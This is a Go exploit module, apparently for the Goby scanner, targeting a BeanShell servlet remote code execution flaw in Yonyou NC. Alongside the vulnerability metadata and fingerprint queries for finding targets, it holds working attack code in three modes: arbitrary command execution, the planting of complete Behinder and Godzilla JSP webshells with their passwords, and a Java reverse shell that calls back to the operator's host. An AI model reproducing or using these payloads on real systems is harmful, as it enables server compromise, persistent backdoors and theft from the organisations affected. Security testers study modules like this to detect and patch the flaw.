package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Yongyou NC bsh.servlet.BshServlet Remote Code Execution Vulnerability",
    "Description": "<p>A command execution vulnerability exists in Yongyou NC.</p><p>Which can be exploited by attackers to obtain server privileges.</p>",
    "Impact": "<p>Which can be exploited by attackers to obtain server privileges.</p>",
    "Recommendation": "<p>The vendor has provided a vulnerability patch. You can download the patch from the following URL: <a href=\"http://umc.yonyou.com/ump/querypatchdetailedmng?PK=18981c7af483007db179a236016f594d37c01f22aa5f5d19\">http://umc.yonyou.com/ump/querypatchdetailedmng?PK=18981c7af483007db179a236016f594d37c01f22aa5f5d19</a></p>",
    "Product": "yonyou-NC-Cloud",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "用友 NC bsh.servlet.BshServlet 远程代码执行漏洞",
            "Product": "用友-NC-Cloud",
            "Description": "<p>用友 NC 是面向集团企业的世界级高端管理软件。</p><p>用友 NC 存在命令执行漏洞，攻击者可利用该漏洞获取服务器权限。</p>",
            "Recommendation": "<p>厂商已提供漏洞修补方案，补丁下载地址： <a href=\"http://umc.yonyou.com/ump/querypatchdetailedmng?PK=18981c7af483007db179a236016f594d37c01f22aa5f5d19\" target=\"_blank\">http://umc.yonyou.com/ump/querypatchdetailedmng?PK=18981c7af483007db179a236016f594d37c01f22aa5f5d19</a><br></p>",
            "Impact": "<p>攻击者可以通过精心构造的请求包对受影响的用友 NC 版本执行远程代码执行。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Yongyou NC bsh.servlet.BshServlet Remote Code Execution Vulnerability",
            "Product": "yonyou-NC-Cloud",
            "Description": "<p>A command execution vulnerability exists in Yongyou NC.</p><p>Which can be exploited by attackers to obtain server privileges.</p>",
            "Recommendation": "<p>The vendor has provided a vulnerability patch. You can download the patch from the following URL: <a href=\"http://umc.yonyou.com/ump/querypatchdetailedmng?PK=18981c7af483007db179a236016f594d37c01f22aa5f5d19\" target=\"_blank\">http://umc.yonyou.com/ump/querypatchdetailedmng?PK=18981c7af483007db179a236016f594d37c01f22aa5f5d19</a><br></p>",
            "Impact": "<p>Which can be exploited by attackers to obtain server privileges.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"/Client/Uclient/UClient.dmg\"",
    "GobyQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"/Client/Uclient/UClient.dmg\"",
    "Author": "李大壮",
    "Homepage": "https://hc.yonyou.com/product.php?id=4",
    "DisclosureDate": "2021-05-24",
    "References": [
        "https://blog.csdn.net/qq_41770175/article/details/102821349"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2021-30167"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/servlet/~ic/bsh.servlet.BshServlet",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "bsh.script=import+org.apache.commons.codec.digest.DigestUtils%3B%0D%0Aprint%28DigestUtils.md5Hex%28%22Weaver%22%29%29%3B%0D%0A%0D"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "410f8051a15a4c16e5cdfccb9dbf547b",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/servlet/~ic/bsh.servlet.BshServlet",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "bsh.script=import+org.apache.commons.codec.digest.DigestUtils%3B%0D%0Aprint%28DigestUtils.md5Hex%28%22Weaver%22%29%29%3B%0D%0A%0D"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "410f8051a15a4c16e5cdfccb9dbf547b",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,webshell,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.jsp",
            "show": "webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<%@ page contentType=\"text/html; charset=UTF-8\" %> <% out.println(\"abc\"); %>",
            "show": "webshell=custom"
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "yongyou-ism"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "9.8",
    "PostTime": "2023-07-17",
    "PocId": "10196"
}`

	sendPayloadFlag6yJs := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/servlet/~ic/bsh.servlet.BshServlet")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		// 执行命令编码
		payload = url.QueryEscape(payload)
		payload = "bsh.script=" + payload + "&bsh.servlet.output=raw"
		postRequestConfig.Data = payload

		return httpclient.DoHttpRequest(hostInfo, postRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomHex := goutils.RandomHexString(16)
			h := md5.New()
			h.Write([]byte(randomHex))
			md5Hex := hex.EncodeToString(h.Sum(nil))
			payload := `import org.apache.commons.codec.digest.DigestUtils;
print(DigestUtils.md5Hex("` + randomHex + `"));`
			rsp, err := sendPayloadFlag6yJs(hostInfo, payload)
			if err != nil {
				return false
			} else {
				return strings.Contains(rsp.Utf8Html, md5Hex)
			}
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "cmd" {
				payload := `import java.lang.*;
import java.util.*;
import java.io.*;
import org.apache.commons.io.IOUtils;
import java.nio.charset.StandardCharsets;
String cmd = "` + goutils.B2S(ss.Params["cmd"]) + `";
if(cmd != null && !"".equals(cmd)) {
    String os = System.getProperty("os.name").toLowerCase();
    cmd = cmd.trim();
    Process process = null;
    String[] executeCmd = null;
    if(os.contains("win")) {
        if(cmd.contains("ping") && !cmd.contains("-n")) {
            cmd = cmd + " -n 4";
        }
        executeCmd = new String[] {"cmd","/c",cmd
        };
    } else {
        if(cmd.contains("ping") && !cmd.contains("-n")) {
            cmd = cmd + " -t 4";
        }
        executeCmd = new String[] {"sh","-c",cmd};
    }
    try {
        process = Runtime.getRuntime().exec(executeCmd);
        String output = IOUtils.toString(process.getInputStream());
        output += IOUtils.toString(process.getErrorStream());
        print(output);
    } catch (Exception e) {
        print(e.toString());
    } finally {
        if(process != null) {
            process.destroy();
        }
    }
} else {
    print("command not null");
}`
				rsp, err := sendPayloadFlag6yJs(expResult.HostInfo, payload)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else {
					if rsp.StatusCode != 200 {
						expResult.Success = false
						expResult.Output = "漏洞利用失败"
					} else {
						expResult.Success = true
						expResult.Output = rsp.Utf8Html
					}
				}
				return expResult
			} else if attackType == "webshell" {
				webshell := goutils.B2S(ss.Params["webshell"])
				filename := goutils.RandomHexString(16)
				var content string
				if webshell == "custom" {
					filename = goutils.B2S(ss.Params["filename"])
					content = goutils.B2S(ss.Params["content"])
				} else if webshell == "behinder" {
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%>`
				}
				if !strings.HasSuffix(filename, ".jsp") {
					filename = filename + ".jsp"
				}
				content = strconv.Quote(content)
				payload := `import java.io.*;
import java.lang.*;
String filename = "` + filename + `";
String content = ` + content + `;
String filePath = System.getProperty("user.dir")+"/webapps/nc_web/"+filename;
BufferedWriter out = null;
try {
    File file = new File(filePath);
    File fileParent = file.getParentFile();
    if (!fileParent.exists()) {
        fileParent.mkdirs();
    }
    file.createNewFile();
    out = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file, true)));
    out.write(content);
	print(filePath);
} catch (Exception e) {
    e.printStackTrace();
} finally {
    try {
out.close();
    } catch (IOException e) {
e.printStackTrace();
    }
}`
				rsp, err := sendPayloadFlag6yJs(expResult.HostInfo, payload)
				if err != nil && (rsp != nil && !strings.Contains(rsp.Utf8Html, filename)) {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				getRequestConfig := httpclient.NewGetRequestConfig("/" + filename)
				getRequestConfig.VerifyTls = false
				getRequestConfig.FollowRedirect = false
				// 二次请求，木马
				rsp, err = httpclient.DoHttpRequest(expResult.HostInfo, getRequestConfig)
				if err != nil || (rsp != nil && (rsp.StatusCode != 200 && rsp.StatusCode != 500)) {
					expResult.Success = false
					expResult.Output = "webshell 写入失败"
					return expResult
				}
				expResult.Success = true
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/" + filename + "\n"
				if attackType != "custom" && webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if attackType != "custom" && webshell == "godzilla" {
					expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
				expResult.Output += "Webshell type: jsp"
				return expResult
			} else if attackType == "reverse" {
				// 申请 port
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				payload := `import java.lang.*;
import java.util.*;
import java.net.*;
import java.io.*;
try {
    String shellPath;
    String ip = "` + godclient.GetGodServerHost() + `";
    String port = "` + rp + `";
    if (!System.getProperty("os.name").toLowerCase().contains("windows")) {
        shellPath = new String("/bin/sh");
    } else {
        shellPath = new String("cmd.exe");
    }
    Process p = Runtime.getRuntime().exec(shellPath);
    Socket s = new Socket(ip, Integer.parseInt(port));
    InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
    OutputStream po = p.getOutputStream(), so = s.getOutputStream();
    while (!s.isClosed()) {
        while (pi.available() > 0) {
            so.write(pi.read());
        }
        while (pe.available() > 0) {
            so.write(pe.read());
        }
        while (si.available() > 0) {
            po.write(si.read());
        }
        so.flush();
        po.flush();
        Thread.sleep(50);
        try {
            p.exitValue();
            break;
        } catch (Exception e) {
        }
    }
    p.destroy();
    s.close();
} catch (Exception e) {
    e.printStackTrace();
}`
				// 发包
				sendPayloadFlag6yJs(expResult.HostInfo, payload)
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
				return expResult
			}
			return expResult
		},
	))
}
